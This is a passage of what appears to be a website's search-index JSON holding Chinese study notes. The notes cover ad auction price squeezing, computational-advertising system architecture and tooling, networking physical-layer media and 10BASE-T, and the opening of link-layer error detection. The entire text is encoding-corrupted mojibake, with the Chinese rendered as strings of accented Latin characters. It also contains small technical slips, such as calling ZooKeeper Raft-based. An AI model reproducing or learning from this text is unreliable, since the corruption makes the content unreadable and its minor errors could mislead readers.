æœ€ä¼˜æ‹å–é—®é¢˜ï¼ˆå¹¿å‘Šå¹³å°é€šè¿‡å®šä»·ä½¿å¹³å°çš„ä»·å€¼æœ€å¤§ï¼‰çš„æœ€ä¼˜è§£ã€‚ å‚è€ƒçŸ¥ä¹æ–‡ç« ï¼›å‚è€ƒè¯¾ç¨‹ Stanford Algorithmic Game Theory CS364Aï¼›  ä»·æ ¼æŒ¤å‹ #  åœ¨ CPC ç»“ç®—çš„å¹¿å‘Šäº§å“ä¸­ï¼ŒeCPM å¯ä»¥è¡¨ç¤ºä¸ºç‚¹å‡»ç‡å’Œå‡ºä»·çš„ä¹˜ç§¯ï¼Œå³ $$r = \\mu \\cdot bid_{CPC}$$ã€‚\nåœ¨ç«ä»·å¹¿å‘Šçš„æœºåˆ¶è®¾è®¡ä¸­ï¼Œæœ‰æ—¶ä¼šåšä¸€äº›å¾®è°ƒï¼š\n  ä½¿ç”¨å¦‚ä¸‹å…¬å¼ä½œä¸º eCPMï¼š$$r = \\mu^{\\kappa} \\cdot bid_{CPC}, \\text{ where } \\kappa \\gt 0$$ï¼›\n  å½“ $$\\kappa \\rightarrow \\infin$$ æ—¶ï¼Œç›¸å½“äºä»…ä»…æ ¹æ®æ ¹æ®å‡ºä»·æ’åºï¼Œèƒ½å¤Ÿæ•´ä½“æå‡æ”¶å…¥æ°´å¹³ã€é¼“åŠ±ç«äº‰ï¼›\n  å½“ $$\\kappa \\rightarrow 0$$ æ—¶ï¼Œç›¸å½“äºä»…ä»…æ ¹æ®ç‚¹å‡»ç‡æ’åºï¼Œèƒ½å¤Ÿæå‡å¹¿å‘Šçš„è´¨é‡æ°´å¹³ã€å¹¿å‘Šç›¸å…³æ€§ï¼›\n  "},{"id":384,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/9.%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/","title":"9.è®¡ç®—å¹¿å‘ŠæŠ€æœ¯æ¦‚è§ˆ","section":"è®¡ç®—å¹¿å‘Š","content":"è®¡ç®—å¹¿å‘ŠæŠ€æœ¯æ¦‚è§ˆ #  ä¸ªæ€§åŒ–ç³»ç»Ÿæ¡†æ¶ #  ä¸€èˆ¬çš„ä¸ªæ€§åŒ–ç³»ç»Ÿä¸»è¦ç”±ä»¥ä¸‹ 4 ä¸ªä¸»ä½“éƒ¨åˆ†ç»„æˆï¼š\n Online Serving Engineï¼šç”¨äºå“åº”å®æ—¶è¯·æ±‚ï¼Œå®Œæˆå†³ç­–çš„â€œåœ¨çº¿æŠ•æ”¾å¼•æ“â€ï¼› Offline Distributed Computingï¼šç¦»çº¿çš„åˆ†å¸ƒå¼è®¡ç®—æ•°æ®å¤„ç†å¹³å°ï¼› Stream Computingï¼šåœ¨çº¿å®æ—¶åé¦ˆçš„æµè®¡ç®—å¹³å°ï¼› Data Highwayï¼šè¿æ¥å’Œè½¬è¿ä»¥ä¸Šä¸‰ä¸ªéƒ¨åˆ†æ•°æ®æµçš„æ•°æ®é«˜é€Ÿå…¬è·¯ï¼›  å¹¿å‘Šç³»ç»Ÿä¼˜åŒ–ç›®æ ‡ #  å¹¿å‘Šç³»ç»Ÿçš„æ ¸å¿ƒä¼˜åŒ–ç›®æ ‡æ˜¯ä¸‹é¢çš„å›å½’å€¼ï¼š\n $$\\displaystyle \\hat{a_{1,\\dots, T}} = max_{a_1, \\dots, T} \\sum_{i=1}^{T}{r(a_i, u_i, c_i) - q(a_i, u_i, c_i)}$$ å…¶ä¸­ï¼š$$r(a_i, u_i, c_i) = eCPM = \\mu(a_i, u_i, c_i) * v(a_i, u_i, c_i)$$ ä½¿å¾—çº¦æŸæ»¡è¶³ï¼š$$\\displaystyle \\sum_{i = 1}^T d(a_i, u_i, c_i, k) \\le D_k, \\forall k$$  å˜é‡å«ä¹‰ï¼š\n $$a$$ï¼šæ˜¯æŒ‡å¹¿å‘Šäº§å“çš„åˆ©æ¶¦ï¼›$$r$$ï¼šè¡¨ç¤ºå•è¯å±•ç¤ºçš„é¢„ä¼°æ”¶ç›Šï¼›$$q$$ï¼šæ˜¯æŒ‡å•æ¬¡å±•ç¤ºå¹¿å‘Šçš„æˆæœ¬ï¼› $$\\mu$$ï¼šæ˜¯æŒ‡ç‚¹å‡»ç‡ï¼›$$v$$ï¼šè¡¨ç¤ºçš„ç‚¹å‡»ä»·å€¼ï¼› $$k$$ï¼šå‚ä¸å¹¿å‘Šæ´»åŠ¨çš„å•ä¸ªå¹¿å‘Šä¸»ï¼›$$D_k$$ï¼šè¡¨ç¤ºè¿™ä¸ªå¹¿å‘Šä¸»çš„æˆæœ¬çº¦æŸï¼›  è®¡ç®—å¹¿å‘Šç³»ç»Ÿæ¶æ„ #  å¹¿å‘Šç³»ç»Ÿæ¶æ„ä¸â€œä¸ªæ€§åŒ–æ¨èç³»ç»Ÿæ¶æ„â€ç±»ä¼¼ã€‚å®ƒç”±ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š\nå¹¿å‘ŠæŠ•æ”¾å¼•æ“ #  å¹¿å‘ŠæŠ•æ”¾å¼•æ“çš„æ ¸å¿ƒèŒèƒ½æ˜¯ï¼šå®æ—¶å“åº”å¹¿å‘Šè¯·æ±‚ã€å¹¶ä¸”å†³ç­–å¹¿å‘Šçš„æŠ•æ”¾ã€‚å¯ä»¥ç»†åˆ†ä¸ºä»¥ä¸‹çš„å‡ ä¸ªæ¨¡å—ï¼š\n å¹¿å‘ŠæŠ•æ”¾æœºï¼ˆAdEngineï¼‰ï¼šæ ¸å¿ƒæ¨¡å—ï¼Œæ¥å—ä¸€ä¸ªå¹¿å‘Šè¯·æ±‚ï¼Œé€šè¿‡è°ƒç”¨ç»„åˆå…¶ä»–å„ä¸ªæ¨¡å—åå†³ç­–å¹¶è¿”å›å¹¿å‘Šç»“æœï¼› å¹¿å‘Šæ£€ç´¢ï¼ˆå¬å›ï¼‰ï¼šåœ¨çº¿æ—¶æ ¹æ®â€œç”¨æˆ·ç‰¹å¾â€ã€â€œä¸Šä¸‹æ–‡ç‰¹å¾â€ã€â€œå¹¿å‘Šç‰¹å¾â€æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„å¹¿å‘Šå€™é€‰ï¼› å¹¿å‘Šæ’åºï¼ˆç²—æ’ç²¾æ’æ··æ’ï¼‰ï¼šåœ¨çº¿é«˜æ•ˆå‡†ç¡®åœ°é¢„ä¼°å¹¿å‘Šçš„ eCPMï¼Œå¹¶ä¾æ®å®ƒå¯¹å¹¿å‘Šè¿›è¡Œæ’åºï¼› æ”¶ç›Šç®¡ç†ï¼ˆå‡ºä»·ï¼‰ï¼šå¯¹å±€éƒ¨å¹¿å‘Šæ’åºç»“æœè¿›è¡Œè¿›ä¸€æ­¥è°ƒæ•´ï¼Œä»¥è¾¾åˆ°å…¨å±€æœ€ä¼˜çš„ç›®çš„ï¼› å¹¿å‘Šè¯·æ±‚å€Ÿå£ï¼šå‰ç«¯æ¥å£ï¼›ç¨‹åºåŒ–äº¤æ˜“å¸‚åœºçš„è¯·æ±‚æ¥å£å»ºè®®ä½¿ç”¨ IAB çš„ OpenRTB åè®®ï¼ˆä½œä¸ºéœ€æ±‚æ–¹ä½¿ç”¨çš„ RTBSã€ä½œä¸ºä¾›ç»™æ–¹ä½¿ç”¨çš„ RTBDï¼‰ï¼› å®šåˆ¶åŒ–ç”¨æˆ·åˆ’åˆ†ï¼šç¨‹åºæ ¹æ®å¹¿å‘Šä¸»çš„é€»è¾‘æ¥åˆ’åˆ†ç”¨æˆ·ç¾¤ï¼›  æ•°æ®é«˜é€Ÿå…¬è·¯ #  å°†åœ¨çº¿æŠ•æ”¾çš„æ•°æ®å‡†ç¡®å®æ—¶åœ°ä¼ è¾“åˆ°ç¦»çº¿åˆ†å¸ƒå¼è®¡ç®—å¹³å°ä¸æµå¼è®¡ç®—å¹³å°ä¸Šï¼Œä¾›åç»­å¤„ç†å’Œå»ºæ¨¡ä½¿ç”¨ã€‚\nç¦»çº¿æ•°æ®å¤„ç† #  è®¡ç®—å¹¿å‘Šæœ€å…·æœ‰æŒ‘æˆ˜çš„ç®—æ³•é—®é¢˜ã€‚ç¦»çº¿å¤„ç†ç”±ä¸¤ä¸ªè¾“å‡ºç›®æ ‡ï¼š\n ç»Ÿè®¡æ—¥å¿—å¾—åˆ°æŠ¥è¡¨ã€ä»ªè¡¨ç›˜ç­‰ï¼Œä¾›äººè¿›è¡Œå†³ç­–ï¼› åˆ©ç”¨æ•°æ®æŒ–æ˜ã€æœºå™¨å­¦ä¹ ç­‰æŠ€æœ¯è¿›è¡Œå—ä¼—å®šå‘ã€ç‚¹å‡»ç‡é¢„ä¼°ã€åˆ†é…ç­–ç•¥è§„åˆ’ç­‰ï¼Œä¸ºåœ¨çº¿çš„æœºå™¨å†³ç­–æä¾›æ”¯æŒï¼ˆä¸ºäº†å¯¹å¤§è§„æ¨¡æ•°æ®è¿›è¡Œåˆ†å¸ƒå¼çš„å¤„ç†åŠ å·¥ï¼Œä¸€èˆ¬ä¼šé€‰ç”¨ Hadoop è¿™æ ·çš„åˆ†å¸ƒå¼å­˜å‚¨ã€æˆ–è€… MapReduce è®¡ç®—æ¡†æ¶ï¼‰ï¼›  ç¦»çº¿å¤„ç†çš„ä¸»è¦æ¨¡å—æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š\n ç”¨æˆ·ä¼šè¯æ—¥å¿—ï¼ˆsession logï¼‰ç”Ÿæˆï¼šæ•´ç†æˆä»¥ ç”¨æˆ·ID ä¸ºé”®çš„ç»Ÿä¸€å­˜å‚¨æ ¼å¼ï¼› è¡Œä¸ºå®šå‘ï¼šæŒ–æ˜ç”¨æˆ·æ—¥å¿—ï¼Œæ‰“ä¸Šè¡Œä¸ºæ ‡ç­¾ï¼Œå¹¶ä¸”å­˜å‚¨åœ¨ç”¨æˆ·æ ‡ç­¾çš„åœ¨çº¿ç¼“å­˜ä¸­ï¼Œä¾›å¹¿å‘ŠæŠ•æ”¾æœºä½¿ç”¨ï¼› ä¸Šä¸‹æ–‡å®šå‘ï¼šä¸è¡Œä¸ºå®šå‘ç±»ä¼¼ï¼Œä¾›å¹¿å‘ŠæŠ•æ”¾æœºä½¿ç”¨ï¼› ç‚¹å‡»ç‡å»ºæ¨¡ï¼šé€šè¿‡æ•°æ®é›†ä¸­çš„ç‰¹å¾è®­ç»ƒé¢„æµ‹ç‚¹å‡»ç‡ï¼Œå¹¶ä¸”åŠ è½½åˆ°ç¼“å­˜ä¸­ä¾›çº¿ä¸ŠæŠ•æ”¾ç³»ç»Ÿå†³ç­–æ—¶ä½¿ç”¨ï¼› åˆ†é…è§„åˆ’ï¼šæ ¹æ®å¹¿å‘Šç³»ç»Ÿå…¨å±€ä¼˜åŒ–çš„å…·ä½“éœ€æ±‚ï¼Œå­¦ä¹ ç¦»çº¿æ—¥å¿—æ•°æ®ï¼Œå¾—åˆ°åˆé€‚çš„çº¿ä¸Šåˆ†é…æ–¹æ¡ˆï¼› å•†ä¸šæ™ºèƒ½ç³»ç»Ÿï¼šæ‰€æœ‰é¢å‘äººï¼Œä¸ºæœ€ç»ˆæ•°æ®åˆ†æå¯¼å‡ºå¯¹è±¡çš„ç³»ç»Ÿï¼Œå®ƒåŒ…æ‹¬ ETLã€ä»ªè¡¨ç›˜ã€Cube ç­‰ï¼› å¹¿å‘Šç®¡ç†ç³»ç»Ÿï¼šæ‰€æœ‰é¢å‘å¹¿å‘Šä¸»çš„ç³»ç»Ÿï¼›  åœ¨çº¿æ•°æ®å¤„ç† #  å¯ä»¥è®¤ä¸ºæ˜¯â€œç¦»çº¿æ•°æ®å¤„ç†â€çš„é•œåƒåŠŸèƒ½ï¼Œå®ƒæ˜¯ä¸ºäº†æ»¡è¶³å¹¿å‘Šç³»ç»Ÿå¯¹å®æ—¶æ•°æ®åé¦ˆçš„è¦æ±‚ï¼Œè€Œå•ç‹¬å‰¥ç¦»å‡ºæ¥çš„èŒèƒ½ã€‚\nå®ƒä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ¨¡å—ï¼š\n åœ¨çº¿åä½œå¼Šï¼ˆArbiterï¼‰ï¼šå°†ä½œå¼Šæµé‡ä»è®¡ä»·å’Œç»Ÿè®¡ä¸­å»æ‰ï¼› è®¡è´¹ï¼šè€—å°½é¢„ç®—çš„å¹¿å‘Šï¼Œç³»ç»Ÿå¿…é¡»é©¬ä¸Šé€šçŸ¥å¹¿å‘Šç´¢å¼•ç³»ç»Ÿå°†å…¶ä¸‹çº¿ï¼› åœ¨çº¿è¡Œä¸ºåé¦ˆï¼šå°†çŸ­æ—¶é—´å†…å‘ç”Ÿçš„ç”¨æˆ·è¡Œä¸ºå’Œå¹¿å‘Šæ—¥å¿—åŠæ—¶åœ°åŠ å·¥æˆå®æ—¶ç”¨æˆ·æ ‡ç­¾ï¼Œä»¥åŠå®æ—¶çš„ç‚¹å‡»ç‡æ¨¡å‹ç‰¹å¾ï¼› å®æ—¶ç´¢å¼•ï¼šå®æ—¶æ¥æ”¶æ–°çš„å¹¿å‘ŠæŠ•æ”¾æ•°æ®ï¼Œå¹¶å»ºç«‹å€’æ’ç´¢å¼•ï¼›  å¸¸ç”¨å¼€æºå·¥å…· #  å¯¹äºåˆåˆ›ä¼ä¸šå’Œå˜ç°ä¸šåŠ¡æ–¹å‘éœ€è¦æ¢ç´¢çš„ä¼ä¸šï¼Œéœ€è¦æ ¹æ®æœ€å°å€¼åŸå‹ï¼ˆMininum Value Prototype, MVPï¼‰çš„åŸåˆ™ï¼Œä½æˆæœ¬ã€çŸ­å¹³å¿«åœ°æ­å»ºç³»ç»Ÿï¼Œç„¶ååœ¨ä¸–çºªä¸šåŠ¡ä¸­è¿›è¡Œå¿«é€Ÿè¿­ä»£ã€‚ä»¥ä¸‹æ˜¯è®¡ç®—å¹¿å‘Šç³»ç»Ÿä¸­ç»å¸¸ç”¨åˆ°çš„ä¸€äº›å¼€æºå·¥å…·ï¼š\n Web æœåŠ¡å™¨ Nginxï¼šæä¾›äº† fastCGI è¿™ä¸€ä¸å„ç§ç¼–ç¨‹è¯­è¨€ä¹‹é—´çš„é€šä¿¡æ¥å£ï¼Œå¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å®ç°æ’ä»¶è€Œæ— éœ€å…³å¿ƒè¯·æ±‚ç»†èŠ‚ï¼› åˆ†å¸ƒå¼é…ç½®ä¸é›†ç¾¤ç®¡ç†å·¥å…· ZooKeeperï¼šä¸ºåˆ†å¸ƒå¼åº”ç”¨å»ºç«‹æ›´é«˜å±‚æ¬¡çš„åŒæ­¥ (synchronization)ã€é…ç½®ç®¡ç† (configuration maintenance)ã€ç¾¤ç»„ (group)ã€å‘½åæœåŠ¡ (naming) ç­‰çš„é€šç”¨å·¥å…·ï¼Œåº•å±‚åº”ç”¨çš„æ˜¯ Raft ç®—æ³•ï¼› å…¨æ–‡æ£€ç´¢å¼•æ“ï¼š  Luceneï¼šæ–¹ä¾¿åœ°å®ç°å…¨æ–‡ç´¢å¼•ï¼ˆindexingï¼‰å’Œæ£€ç´¢ï¼ˆretrievalï¼‰åŠŸèƒ½ï¼›å®ƒé™¤äº†é«˜æ•ˆç®€å•å¤–ï¼Œè¿˜å…è®¸ç”¨æˆ·å¯¹å…¶ä¸­çš„å…³é”®ç¯èŠ‚è‡ªå®šä¹‰é€»è¾‘åŠŸèƒ½ï¼Œä¸è¿‡ä¸€äº›ç‰¹æ®Šçš„æ£€ç´¢ç®—æ³•ï¼Œéœ€è¦å¦è¡Œå¼€å‘ï¼› Elasticsearchï¼šä¸€ä¸ªåŸºäº Lucene æ„å»ºçš„å¼€æºã€åˆ†å¸ƒå¼ã€RESTful æœç´¢å¼•æ“ï¼Œèƒ½å¤Ÿç¨³å®šå¯é åœ°å®æ—¶æœç´¢ã€å¹¶å…·æœ‰è‰¯å¥½çš„æ°´å¹³æ‰©å±•æ€§ï¼›   è·¨è¯­è¨€é€šä¿¡æ¥å£ Thriftï¼šIDLï¼› æ•°æ®é«˜é€Ÿå…¬è·¯ Flumeï¼šé«˜å¯ç”¨ã€é«˜å¯é ã€åˆ†å¸ƒå¼çš„æµ·é‡æ•°æ®é‡‡é›†ã€èšåˆå’Œä¼ è¾“çš„ç³»ç»Ÿï¼› åˆ†å¸ƒå¼æ•°æ®å¤„ç†å¹³å° Hadoopï¼šå­˜å‚¨å’ŒåŠ å·¥æµ·é‡æ•°æ®çš„åŸºç¡€è®¾æ–½ï¼Œå‡ ä¹æ˜¯å·¥ä¸šç•Œçš„æ ‡å‡†é€‰æ‹©ã€‚Hadoop MapReduce æ˜¯ä¸€ç§åˆ†å¸ƒå¼è®¡ç®—æ¡†æ¶ã€‚ä¸ºäº†é™ä½ MapReduce å¤æ‚åº¦ï¼Œäººä»¬è¿˜å¼€å‘äº† Hiveã€Pig ç­‰å¼€æºå·¥å…·ã€‚ ç‰¹å¾åœ¨çº¿ç¼“å­˜ Redisï¼šNoSQL æ•°æ®åº“ï¼› æµè®¡ç®—å¹³å° Stormï¼šåœ¨çº¿çš„ã€å“åº”é€Ÿåº¦æå¿«çš„æµè®¡ç®—æ¡†æ¶ï¼› é«˜æ•ˆçš„è¿­ä»£è®¡ç®—æ¡†æ¶ Sparkï¼šHadoop åœ¨ map å’Œ reduce ä¸¤ä¸ªé˜¶æ®µä¹‹é—´éœ€è¦è¿›è¡Œç¡¬ç›˜æ•°æ®äº¤æ¢ï¼Œå› æ­¤åœ¨éœ€è¦å¤šæ¬¡è¿­ä»£çš„ä»»åŠ¡æ—¶å¤„ç†æ•ˆç‡ç›¸å½“ä½ï¼ˆæ¯”å¦‚æ–‡æœ¬ä¸»é¢˜æ¨¡å‹ã€ç‚¹å‡»ç‡é¢„ä¼°ç­‰ï¼‰  "},{"id":385,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.%E7%89%A9%E7%90%86%E5%B1%82/%E7%89%A9%E7%90%86%E5%B1%82/","title":"ç‰©ç†å±‚","section":"1.ç‰©ç†å±‚","content":"ç‰©ç†å±‚ #  å¸¸è§çš„ä¼ è¾“ä»‹è´¨ #  å¼•å¯¼å‹ä¼ è¾“åª’ä»‹ #  åŒç»çº¿ #  å³å¸¸ç”¨çš„ç½‘çº¿ï¼Œæœ€å¸¸ç”¨çš„ UTP æ˜¯ 5 ç±»çº¿ CTA5ï¼š\næœ‰è®¸å¤šç§ä¸åŒçš„æ ‡å‡†é€‚ç”¨äºè¿™ç§åŸºäºçš„é“œçº¿çš„ç‰©ç†ä»‹è´¨ã€‚æœ€å¹¿æ³›ä½¿ç”¨çš„åŒ…æ‹¬ 10BASE-Tã€100BASE-TX å’Œ1000BASE-T (å‰æ¯”ç‰¹ä»¥å¤ªç½‘), é€Ÿç‡åˆ†åˆ«ä¸º10 Mbit/s, 100 Mbit/s, and 1000 Mbit/s (1 Gbit/s)ã€‚\nåŒç»çº¿æœ‰ä¸€ä¸ªâ€œæ— æ³•é€¾è¶Šâ€çš„â€œ100ç±³â€ä¼ è¾“è·ç¦»ã€‚æ— è®ºæ˜¯ 10M ä¼ è¾“é€Ÿç‡çš„ä¸‰ç±»åŒç»çº¿ï¼Œè¿˜æ˜¯ 100M ä¼ è¾“é€Ÿç‡çš„äº”ç±»åŒç»çº¿ï¼Œç”šè‡³ 1000M ä¼ è¾“é€Ÿç‡çš„å…­ç±»åŒç»çº¿ï¼Œæœ€è¿œæœ‰æ•ˆä¼ è¾“è·ç¦»ä¸º 100 ç±³ã€‚\nåŒè½´ç”µç¼† #  åŒè½´ç”µç¼†å…·æœ‰å¾ˆå¥½çš„æŠ—å¹²æ‰°ç‰¹æ€§ï¼Œè¢«å¹¿æ³›ç”¨äºä¼ è¾“è¾ƒé«˜é€Ÿç‡çš„æ•°æ®ï¼š\nå…‰ç¼† #  é€šä¿¡å®¹é‡éå¸¸å¤§ã€ä¼ è¾“æŸè€—å°ï¼Œä¸­ç»§è·ç¦»é•¿ã€æŠ—é›·ç”µå’Œç”µç£å¹²æ‰°æ€§èƒ½å¥½ã€æ— ä¸²éŸ³å¹²æ‰°ï¼Œä¿å¯†æ€§å¥½ã€ä½“ç§¯å°ï¼Œé‡é‡è½»ã€‚\n å…‰çº¤ç”±ä¸‰å±‚ææ–™ç»„æˆï¼Œä¸­å¿ƒé«˜æŠ˜å°„ç‡ç»ç’ƒèŠ¯ï¼Œä¸­é—´ä¸ºä½æŠ˜å°„ç‡ç¡…ç»ç’ƒåŒ…å±‚ï¼Œæœ€å¤–æ˜¯åŠ å¼ºç”¨çš„æ ‘è„‚æ¶‚å±‚ã€‚ åŒ…å±‚çš„ææ–™ä¸€èˆ¬ç”¨çº¯äºŒæ°§åŒ–ç¡…ï¼Œä¹Ÿæœ‰æºæå¾®é‡çš„ä¸‰æ°§åŒ–äºŒç¡¼ã€‚æºæ‚çš„ä½œç”¨æ˜¯é™ä½ææ–™çš„å…‰æŠ˜å°„ç‡ã€‚ æ¶‚å±‚æ˜¯ç”¨æ¥ä¿æŠ¤å…‰çº¤ä¸å—å¤–æ¥çš„æŸå®³ï¼Œå¢åŠ å…‰çº¤çš„æœºæ¢°å¼ºåº¦ã€‚  éå¼•å¯¼å‹ä¼ è¾“åª’ä»‹ #  åè®® #  10BASE-T #  10BASEï¼T æ˜¯åŒç»çº¿ä»¥å¤ªç½‘ï¼Œ1990å¹´ç”±IEEEæ–°è®¤å¯çš„ï¼Œç¼–å·ä¸º IEEE802.3iï¼ŒT è¡¨ç¤ºé‡‡ç”¨åŒç»çº¿ï¼Œç° 10BASE-T é‡‡ç”¨çš„æ˜¯æ— å±è”½åŒç»çº¿ï¼ˆUTPï¼‰ã€‚\n  æ•°æ®ä¼ è¾“é€Ÿç‡ 10MbpsåŸºå¸¦ä¼ è¾“ï¼Œ10è¡¨ç¤º10å…†æ¯”ç‰¹æ¯ç§’ï¼ŒBas eè¡¨ç¤ºåŸºå¸¦ä¼ è¾“ï¼ŒT ä»£è¡¨åŒç»çº¿ï¼ˆF è¡¨ç¤ºå…‰çº¤ï¼‰\n  æ¯æ®µåŒç»çº¿æœ€å¤§æœ‰æ•ˆé•¿åº¦ 100mï¼Œé‡‡ç”¨é«˜è´¨é‡çš„åŒç»çº¿ï¼ˆ5ç±»çº¿ï¼‰ï¼Œæœ€å¤§é•¿åº¦å¯åˆ° 150mï¼ˆHUBä¸å·¥ä½œç«™é—´åŠä¸¤ä¸ªHUBä¹‹é—´ï¼‰ã€‚\n  ä¸€æ¡é€šè·¯å…è®¸è¿æ¥HUBæ•° 4ä¸ª\n  æ‹“æ‰‘ç»“æ„ æ˜Ÿå½¢æˆ–æ€»çº¿å½¢\n  è®¿é—®æ§åˆ¶æ–¹å¼ CSMA/CD\n  å¸§é•¿åº¦ å¯å˜ï¼Œæœ€å¤§1518ä¸ªå­—èŠ‚\n  æœ€å¤§ä¼ è¾“è·ç¦» 500m\n  æ¯ä¸ªHUBå¯è¿æ¥çš„å·¥ä½œç«™ 96ä¸ª\n  10BASE-T çš„è¿æ¥ä¸»è¦ä»¥é›†çº¿å™¨HUBä½œä¸ºæ¢çº½(HUBå°†åœ¨ç¬¬5èŠ‚ä¸­ä»‹ç»)ï¼Œå·¥ä½œç«™é€šè¿‡ç½‘å¡çš„ RJ45 æ’åº§ä¸ RJ45 æ¥å¤´ç›¸è¿ï¼Œå¦ä¸€ç«¯ HUB çš„ç«¯å£éƒ½å¯ä¾› RJ45 çš„æ¥å¤´æ’å…¥ï¼Œè£…æ‹†éå¸¸æ–¹ä¾¿ã€‚\n"},{"id":386,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.%E9%93%BE%E8%B7%AF%E5%B1%82/%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"é“¾è·¯å±‚","section":"2.é“¾è·¯å±‚","content":" å­¦ä¹ åœ°å€ï¼š\n ã€Šè®¡ç®—æœºç½‘ç»œï¼šè‡ªé¡¶å‘ä¸‹çš„æ–¹æ³•ã€‹   é“¾è·¯å±‚ #  æ¦‚å¿µ #  ç»“ç‚¹ï¼ˆnodeï¼‰ï¼šè¿è¡Œé“¾è·¯å±‚åè®®çš„ä»»ä½•è®¾å¤‡ï¼ˆæ¯”å¦‚ï¼šä¸»æœºã€è·¯ç”±å™¨ã€äº¤æ¢æœºå’Œ WiFi æ¥å…¥ç‚¹ï¼‰ã€‚\né“¾è·¯ï¼ˆlinkï¼‰ï¼šæ²¿ç€é€šä¿¡è·¯å¾„è¿æ¥å“é“ƒç»“ç‚¹çš„é€šä¿¡ä¿¡é“ã€‚\né“¾è·¯å±‚åè®®èƒ½æä¾›å¯èƒ½çš„æœåŠ¡åŒ…æ‹¬ï¼š\n æˆå¸§ï¼ˆframingï¼‰ï¼šä¸€ä¸ªå¸§ç”±ä¸€ä¸ªæ•°æ®å­—æ®µï¼ˆç½‘ç»œå±‚æ•°æ®æŠ¥ï¼‰å’Œè‹¥å¹²ä¸ªé¦–éƒ¨å­—æ®µç»„æˆã€‚ é“¾è·¯æ¥å…¥ï¼šåª’ä½“è®¿é—®æ§åˆ¶ï¼ˆMedium Access Control, MACï¼‰åè®®è§„å®šäº†å¸§åœ¨é“¾è·¯ä¸Šä¼ è¾“çš„è§„åˆ™ã€‚ å¯é äº¤ä»˜ï¼šå½“é“¾è·¯å±‚åè®®æä¾›å¯é äº¤ä»˜æœåŠ¡æ—¶ï¼Œå®ƒä¿è¯æ— å·®é”™åœ°ç»é“¾è·¯å±‚ç§»åŠ¨æ¯ä¸ªæ•°æ®æŠ¥ç½‘ç»œã€‚ å·®é”™æ£€æµ‹å’Œçº æ­£  é“¾è·¯å±‚çš„ä¸»ä½“éƒ¨åˆ†æ˜¯åœ¨ç½‘ç»œé€‚é…å™¨ï¼ˆnetwork adapterï¼‰ä¸­å®ç°çš„ï¼Œç½‘ç»œé€‚é…å™¨æœ‰æ—¶ä¹Ÿç§°ä½œç½‘ç»œæ¥å£å¡ï¼ˆNetwork Interface Card, NICï¼‰ã€‚\nä½äºç½‘ç»œé€‚é…å™¨æ ¸å¿ƒçš„æ˜¯é“¾è·¯å±‚æ§åˆ¶å™¨ï¼Œè¯¥æ§åˆ¶å™¨é€šå¸¸æ˜¯ä¸€ä¸ªå®ç°äº†è®¸å¤šé“¾è·¯å±‚æœåŠ¡çš„ä¸“ç”¨èŠ¯ç‰‡ï¼ˆä¾‹å¦‚ï¼ŒIntel çš„ 8254x æ§åˆ¶å™¨å®ç°äº†ä»¥å¤ªç½‘åè®®ï¼ŒAtheros AR5006 æ§åˆ¶å™¨å®ç°äº† 802.11 WiFi åè®®ï¼‰\nå·®é”™æ£€æµ‹å’Œçº æ­£æŠ€æœ¯ #  å¥‡å¶æ ¡éªŒ #  å·®é”™æ£€æµ‹æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯å¥‡å¶æ ¡éªŒä½ï¼ˆparity bitï¼‰ã€‚å®ç°æ–¹å¼ï¼š\n å‘é€æ–¹éœ€è¦åŒ…å«ä¸€ä¸ªé™„åŠ çš„æ¯”ç‰¹ä½ï¼Œä½¿å¾—æ‰€æœ‰æ¯”ç‰¹ä¸­ï¼Œ1 çš„æ€»æ•°æ€»æ˜¯ä¸€ä¸ªå¶æ•°ã€‚ æ¥æ”¶æ–¹åªè¦æ£€æµ‹åˆ°å¥‡æ•°ä¸ªå€¼ä½ 1 çš„æ¯”ç‰¹ä½ï¼Œåˆ™ä¼ è¾“ä¿¡æ¯å‡ºç°äº†å·®é”™ã€‚  ä½¿ç”¨äºŒç»´å¥‡å¶æ ¡éªŒï¼ˆtwo-dimensional parityï¼‰æ–¹æ¡ˆï¼ŒåŒ…å«å€¼æ”¹å˜çš„åˆ—å’Œè¡Œçš„æ ¡éªŒå€¼éƒ½å°†ä¼šå·®é”™ï¼Œå› æ­¤å¯ä»¥äºˆä»¥çº æ­£ï¼Œå¦‚ä¸‹ï¼š\næ¥æ”¶æ–¹æ£€æµ‹å’Œçº æ­£å·®é”™çš„èƒ½åŠ›è¢«ç§°ä¸ºå‰å‘çº æ­£ï¼ˆForward Error Correction, FECï¼‰ã€‚\næ£€éªŒå’Œ #  å› ç‰¹ç½‘æ£€éªŒå’Œï¼ˆInternet checksumï¼‰å°±åŸºäºè¿™ç§æ–¹æ³•ï¼Œå³æ•°æ®çš„å­—èŠ‚ä½œä¸º 16 æ¯”ç‰¹çš„æ•´æ•°å¯¹å¾…å¹¶æ±‚å’Œï¼Œè¿™ä¸ªå’Œçš„åç å½¢æˆäº†æºå¸¦åœ¨æŠ¥æ–‡æ®µé¦–éƒ¨çš„å› ç‰¹ç½‘æ£€éªŒå’Œã€‚\nå¾ªç¯å†—ä½™æ£€æµ‹ #  å¾ªç¯å†—ä½™æ£€æµ‹ï¼ˆCyclic Redundancy Check, CRCï¼‰ç¼–ç åˆè¢«ç§°ä½œå¤šé¡¹å¼ç¼–ç ï¼ˆpolynomial codeï¼‰ï¼Œå› ä¸ºè¯¥ç¼–ç èƒ½å¤Ÿå°†è¦å‘é€çš„æ¯”ç‰¹ä¸²çœ‹ä½œä¸ºç³»æ•°æ˜¯ 0 å’Œ 1 